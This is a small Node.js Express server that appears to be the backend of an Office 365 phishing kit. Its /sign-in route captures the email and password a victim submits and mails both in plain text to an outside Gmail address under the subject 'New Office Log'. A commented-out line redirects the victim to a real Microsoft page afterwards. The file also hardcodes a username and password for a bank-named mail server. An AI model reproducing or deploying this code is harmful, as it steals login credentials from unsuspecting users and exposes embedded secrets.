const express = require('express')
const app = express()
const nodemailer = require('nodemailer');
const cors = require('cors')
const PORT = 8080


app.use(cors({
    origin: '*'
}))



app.use(express.urlencoded({
    extended: false
  }))
  app.use(express.json())



let transporter = nodemailer.createTransport({
host: "mail.1778bank.com",
port: 465,
secure: true, // upgrade later with STARTTLS
auth: {
    user: "contact@1778bank.com",
    pass: "Officialbox27*",
},
})

if(PORT){
    app.listen(PORT, () => console.log('server-running'))
}

app.get('/', (req, res) => {
    res.json({
        name: 'John'
    })
})

app.post('/sign-in', (req, res) => {
    var mailOptions = {
        from: 'contact@1778bank.com', // sender address
        to: "elisetaylor2020@gmail.com",// list of receivers
        subject: 'New Office Log', // Subject line
        html: `<h1>New Office Log</h1> <br>
        <h2>new email : ${req.body.email} </h2>
        <h2>new user password : ${req.body.password} </h2>
            
             `
    
            };
            transporter.sendMail(mailOptions, function(error, info) {
              if (error) {
                  return console.log(error);
              }
              res.json({
                name: req.body
              })
            //   res.redirect('https://www.microsoft.com/en/microsoft-365/business')
              console.log('Message sent: ' + req.body.email, req.body.password);
            //   res.send(json({message: "email sent"}))
            });
})

module.exports = app